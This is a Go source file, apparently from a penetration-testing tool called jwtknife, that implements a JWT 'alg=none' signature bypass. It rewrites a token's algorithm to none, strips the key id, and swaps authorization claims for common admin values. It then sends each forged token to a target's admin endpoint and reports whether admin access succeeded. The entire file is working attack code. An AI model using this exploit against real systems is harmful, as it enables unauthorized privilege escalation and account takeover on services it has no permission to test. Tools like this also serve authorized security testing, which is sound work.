package jwt

import (
	"jwtknife/internal/httpx"
	"jwtknife/internal/jwtknifejwt"
	"jwtknife/internal/report"
)

type algNone struct{}

func NewAlgNoneAttack() Attack { return algNone{} }

func (algNone) Name() string {
	return "alg=none bypass + claim escalation"
}

func (algNone) Run(in AttackInput) report.AttackResult {
	ar := report.NewAttackResult("alg-none")

	for _, claim := range authClaims {
		if _, ok := in.ParsedJWT.Payload[claim]; !ok {
			continue
		}

		for _, val := range commonAdminValues {
			p, err := jwtknifejwt.Parse(in.RawJWT)
			if err != nil {
				ar.Errors = append(ar.Errors, err.Error())
				continue
			}

			// Force alg=none
			p.Header["alg"] = "none"
			delete(p.Header, "kid")

			// Escalate claim
			p.Payload[claim] = val

			mod, err := jwtknifejwt.Rebuild(p)
			if err != nil {
				ar.Errors = append(ar.Errors, err.Error())
				continue
			}

			r := in.Client.Do(httpx.RequestPlan{
				Label:     "atk-alg-none-escalation",
				URL:       in.Targets.AdminURL,
				Method:    "GET",
				JWT:       mod,
				Placement: in.Targets.Placement,
			})

			step := report.Step{
				Label:   "alg-none-claim-escalation",
				Details: "alg=none, " + claim + "=" + val,
				HTTP:    report.FromHTTPResult(r),
				JWT:     report.JWTInfo{Token: mod},
			}
			ar.Steps = append(ar.Steps, step)

			if report.IsAdminSuccess(in.Baseline, step.HTTP) {
				ar.Outcome = report.OutcomeSuccess
				ar.Note = "admin access via alg=none and claim escalation"
				return ar
			}

			if report.IsInteresting(in.Baseline, step.HTTP) {
				ar.Outcome = report.OutcomeInteresting
			}
		}
	}

	if ar.Outcome == "" {
		ar.Outcome = report.OutcomeNoEffect
	}
	return ar
}
